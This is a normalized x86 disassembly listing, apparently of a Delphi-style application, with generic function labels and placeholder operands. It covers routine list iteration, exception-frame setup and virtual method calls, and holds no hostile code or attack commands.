mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47b8f0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
test esi esi
jne r-xdata
mov eax esi
call sub_419748
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ esp ]
mov esi [ eax + 0x6c ]
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
mov edx ebx
mov eax esi
call sub_47caec
call sub_47d670
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_47caec
call sub_47eb64
cmp eax [ esp + 0x4 ]
jne r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_47caec
call sub_47d6b0
mov ecx eax
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_47b8f0
mov ebp eax
test ebp ebp
jne r-xdata
mov edx ebx
mov eax esi
call sub_47caec
mov ebp eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_47caec
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_47b998
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
test esi esi
jne r-xdata
mov eax esi
call sub_419748
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ esp ]
mov esi [ eax + 0x6c ]
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
mov edx ebx
mov eax esi
call sub_47caec
call sub_47d670
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_47caec
mov ebp eax
jmp r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_47caec
call sub_47d6b0
mov ecx eax
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_47b998
mov ebp eax
test ebp ebp
jne r-xdata
mov edx ebx
mov eax esi
call sub_47caec
mov eax [ eax + 0xc ]
cmp eax [ esp + 0x4 ]
jne r-xdata
sub_47ba28
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47bb24
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b510
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47bb02
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_403788#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47bb38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bb09
lea eax [ ebp - 0x8 ]
call sub_40d4f0
retn
sub_47ba95
lea eax [ ebp - 0x8 ]
call sub_40d4f0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405df8
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x18 ]
xor ecx ecx
pop eax
call sub_40911c
mov eax [ ebp - 0xc ]
mov cx [ r-xdata ]
mov dl 0x1
call sub_431c8c
cmp eax 0x6
jne r-xdata
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bb09
lea eax [ ebp - 0x8 ]
call sub_40d4f0
retn
mov eax [ ebp - 0x4 ]
call sub_408878
sub_47bb38
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x90 ] 0x1
xor eax eax
push ebp
push sub_47bc1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47b830
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x88 ] ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
push ebp
push sub_47bbdc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_41b784
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41b018
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41b388
mov eax [ ebp - 0x4 ]
call sub_421398
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_47c05c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bc26
mov eax [ ebp - 0x4 ]
mov [ eax + 0x90 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_4032a8
retn
sub_47bc30
push ebx
push esi
push edi
push ebp
mov ebx eax
mov eax ebx
call sub_421398
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ ebx + 0x6c ]
mov eax ebx
call sub_47c05c
mov eax [ ebx + 0x8c ]
call sub_408868
test al al
je r-xdata
mov eax [ ebx + 0x6c ]
call sub_419748
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x6c ]
inc [ eax + 0x28 ]
mov edx [ ebx + 0x8c ]
mov eax ebx
call sub_47ba28
jmp r-xdata
inc edi
xor esi esi
test [ ebx + 0x1c ] 0x10
jne r-xdata
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47ddbc
mov eax [ eax + 0xc ]
call sub_48254c
mov ebp eax
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47ddbc
mov eax [ eax + 0xc ]
cmp ebp [ eax + 0x274 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47ddbc
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47ddbc
mov eax [ eax + 0xc ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x12c ]
sub_47bcf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
mov cl [ ebp - 0x1 ]
mov edx edi
mov eax ebx
call sub_458fc8
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebx + 0x8c ]
call sub_4042f8
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
test [ ebx + 0x1c ] 0x8
jne r-xdata
cmp [ ebx + 0x98 ] 0x0
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx [ ebx + 0x8c ]
mov eax ebx
call sub_47bee8
mov [ ebx + 0x98 ] 0x1
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor ecx ecx
mov edx edi
mov eax ebx
call sub_47b8f0
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47be41
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov ecx [ ebx + 0x6c ]
mov esi edi
mov edx esi
mov eax ebx
call sub_47b998
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
call sub_47eb58
mov eax [ eax + 0x20 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x84 ] 0x0
je r-xdata
mov ecx [ ebx + 0x88 ]
mov edx esi
mov eax ebx
call sub_47b998
test eax eax
je r-xdata
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
call sub_4032a8
retn
inc ebx
xor esi esi
mov eax esi
call sub_4193b8
push eax
mov eax esi
call sub_47eb58
pop edx
call sub_419a28
xor ecx ecx
mov edx edi
mov eax ebx
call sub_47b8f0
mov esi eax
test esi esi
jne r-xdata
mov eax esi
call sub_47eb58
mov eax [ eax + 0x20 ]
mov eax [ eax + 0xc ]
call sub_44f950
mov eax esi
call sub_47eb58
mov eax [ eax + 0x20 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418778
mov eax [ ebx + 0x84 ]
call sub_419748
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4188d4
call sub_44f958
mov eax [ ebx + 0x84 ]
mov edx esi
call sub_47cad8
cmp edi [ eax + 0xc ]
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4188d4
test eax eax
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x84 ]
mov edx esi
call sub_419a28
jmp r-xdata
sub_47bee8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47bfd9
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_459180
xor eax eax
push ebp
push sub_47bf9f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffff
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_408990
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b510
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47bf8e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_403788#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47bfe8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bf95
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
sub_47bf95
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bfe0
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40405c
retn
sub_47bfa4
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405df8
mov eax [ ebp - 0xc ]
call sub_431d84
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bfe0
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40405c
retn
sub_47bfe8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47c04e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b3e8
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_41b018
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41b294
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c055
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
sub_47c05c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov eax ebx
call sub_419748
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_419748
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
inc ebp
xor edi edi
inc edi
dec ebp
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_47cd2c
mov edx edi
mov eax ebx
call sub_47caec
push eax
mov edx edi
mov eax ebx
call sub_47caec
mov eax [ eax + 0xc ]
pop edx
mov ecx [ eax ]
call [ ecx + 0x124 ]
mov edx edi
mov eax ebx
call sub_47caec
mov eax [ eax + 0xc ]
mov si 0xffcf
call sub_4034a4
mov edx edi
mov eax ebx
call sub_47caec
mov eax [ eax + 0xc ]
mov si 0xffd0
call sub_4034a4
mov edx edi
mov eax ebx
call sub_47caec
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_47c0f8
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
cmp edx [ edi + 0x38 ]
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x8
je r-xdata
mov eax edi
call sub_458f88
test bl bl
je r-xdata
mov bl 0x1
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x6c ]
call sub_419748
dec eax
test eax eax
jl r-xdata
inc eax
mov [ esp ] eax
xor ebp ebp
inc ebp
dec [ esp ]
jne r-xdata
inc esi
xor ebx ebx
mov eax [ edi + 0x6c ]
mov edx ebp
call sub_47ddbc
call sub_47d6b0
call sub_419748
mov esi eax
dec esi
test esi esi
jl r-xdata
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x6c ]
mov edx ebp
call sub_47ddbc
call sub_47d6b0
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov eax [ edi + 0x6c ]
mov edx ebp
call sub_47ddbc
call sub_47d6b0
mov edx ebx
call sub_47df90
cmp [ eax + 0x40 ] 0x0
je r-xdata
sub_47c19c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47c1fc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_41a018
mov eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
call sub_41a018
mov eax [ ebp - 0x8 ]
pop edx
call sub_40810c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c203
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
sub_47c20c
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47c36b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40817c
mov eax [ ebp - 0xc ]
call sub_4042f8
test eax eax
jne r-xdata
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax ebx
call sub_41a018
mov eax [ ebp - 0x18 ]
call sub_4083b8
lea ecx [ ebp - 0x20 ]
xor edx edx
mov eax ebx
call sub_41a018
mov edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_41a1f8
mov eax [ ebp - 0x1c ]
call sub_4083b8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405df8
mov eax [ ebp - 0x14 ]
mov cx [ r-xdata ]
mov dl 0x3
call sub_431c8c
dec eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c372
lea eax [ ebp - 0x28 ]
mov edx 0x8
call sub_40405c
retn
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x94 ]
lea ecx [ ebp - 0x28 ]
mov edx esi
mov eax ebx
call sub_41a018
mov edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x24 ]
mov eax ebx
call sub_41a1f8
mov eax [ ebp - 0x24 ]
call sub_4083b8
mov ecx eax
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
mov edx sub_47c19c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov ecx [ eax ]
call [ ecx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
sub_47c37a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_47c433
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x44 ] 0xffffffff
je r-xdata
mov bl 0x1
mov eax [ esi + 0x94 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c43a
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov eax [ esi + 0x6c ]
mov eax [ eax + 0x28 ]
sub eax [ edi + 0x5c ]
mov [ ebp - 0x4 ] eax
xor ebx ebx
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0x94 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
test bl bl
jne r-xdata
mov eax [ esi + 0x94 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ esi + 0x94 ]
call sub_41a018
mov eax [ ebp - 0x8 ]
call sub_4083b8
cmp eax [ edi + 0x44 ]
jl r-xdata
mov edx ebx
mov eax [ esi + 0x94 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp eax [ ebp - 0x4 ]
setg al
mov ebx eax
dec ebx
inc ebx
sub_47c444
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47c492
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x94 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40810c
test eax eax
setne al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c499
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_47c4a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x88 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47ddbc
mov edi [ eax + 0xc ]
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47ddbc
xor edx edx
call sub_47d8b8
mov edx esi
mov eax [ ebx + 0x88 ]
call sub_419750
push eax
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_419750
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47ddbc
mov edx edi
call sub_47d8b8
sub_47c504
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov eax [ r-xdata ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419a90
mov [ ebx + 0x84 ] eax
sub_47c540
push ebx
mov ebx eax
mov eax ebx
call sub_45904c
mov eax [ ebx + 0x6c ]
test eax eax
je r-xdata
pop ebx
retn
push 0x0
push 0x0
mov edx eax
call sub_47d27c
sub_47c560
push ebx
push ecx
mov edx [ r-xdata ]
mov [ esp ] edx
cmp [ eax + 0xba ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
mov eax [ esp ]
pop edx
pop ebx
retn
mov eax [ r-xdata ]
mov [ esp ] eax
sub_47c59c
push ebx
push ecx
mov edx [ r-xdata ]
mov [ esp ] edx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
mov eax [ esp ]
pop edx
pop ebx
retn
mov eax [ r-xdata ]
mov [ esp ] eax
sub_47c5d8
push ebx
push esi
mov ebx [ r-xdata ]
cmp [ eax + 0xaa ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
mov esi eax
mov ecx ebx
mov edx eax
mov eax [ esi + 0xac ]
call [ esi + 0xa8 ]
mov eax ebx
pop esi
pop ebx
retn
mov ebx [ r-xdata ]
sub_47c60c
push ebx
push ecx
mov edx [ r-xdata ]
mov [ esp ] edx
cmp [ eax + 0xa2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
mov eax [ esp ]
pop edx
pop ebx
retn
mov eax [ r-xdata ]
mov [ esp ] eax
sub_47c648
push ebx
mov ebx eax
cmp [ ebx + 0x84 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_47c680
call sub_419748
test eax eax
jg r-xdata
mov al 0x1
pop ebx
retn
sub_47c680
push ebx
mov ebx eax
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov eax [ ebx + 0x84 ]
pop ebx
retn
mov eax [ r-xdata ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419a90
mov [ ebx + 0x84 ] eax
sub_47c6b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47c781
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41deec
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c788
lea eax [ ebp - 0x8 ]
call sub_404038
retn
xor eax eax
push ebp
push j_sub_403788
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx eax
mov eax [ rw-data ]
call sub_484674
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_47c83c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_47c725
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_403a9c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
call sub_40277c
push eax
call sub_40275c
pop edx
call sub_40b908
jmp r-xdata
call sub_40275c
mov edx eax
mov ebx [ rw-data ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
jmp r-xdata
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c788
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_47c790
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
push ebp
push sub_47c7f4
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ eax + 0xc8 ]
test edx edx
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_484674
mov ebx eax
mov ebx edx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420bf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c7fb
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_47c800
push ebx
mov ebx eax
mov eax ebx
call sub_4034fc
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx eax
mov eax [ rw-data ]
call sub_484674
mov [ ebx + 0xc8 ] eax
sub_47c83c
push ebx
push esi
push edi
push ebp
mov ebx eax
cmp edx [ ebx + 0xc8 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0xc8 ] edx
mov eax [ ebx + 0x6c ]
call sub_419748
mov edi eax
dec edi
test edi edi
jl r-xdata
cmp [ ebx + 0xc2 ] 0x0
je r-xdata
inc edi
xor esi esi
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx ebx
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47ddbc
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x144 ]
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47ddbc
mov eax [ eax + 0xc ]
call sub_48254c
mov ebp eax
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47ddbc
mov eax [ eax + 0xc ]
cmp ebp [ eax + 0x274 ]
jne r-xdata
xor eax eax
call sub_47b62c
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47ddbc
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47ddbc
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47ddbc
mov eax [ eax + 0xc ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x12c ]
sub_47c90c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47c9c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418f24
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c9cc
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor edx edx
push ebp
push sub_47c9a8
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47ca3c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_47c9d4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
add eax 0x10
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_47c9d4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_40408c
mov eax [ esi ]
call sub_4042f8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_405df8
mov eax esi
mov edx [ edi + 0x8 ]
call sub_40408c
jmp r-xdata
sub_47ca14
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4193d0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_47c9d4
pop esi
pop ebx
retn
sub_47ca3c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47cabc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47ca38
call sub_47cacc
cmp esi eax
jne r-xdata
cmp esi [ ebx + 0xc ]
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
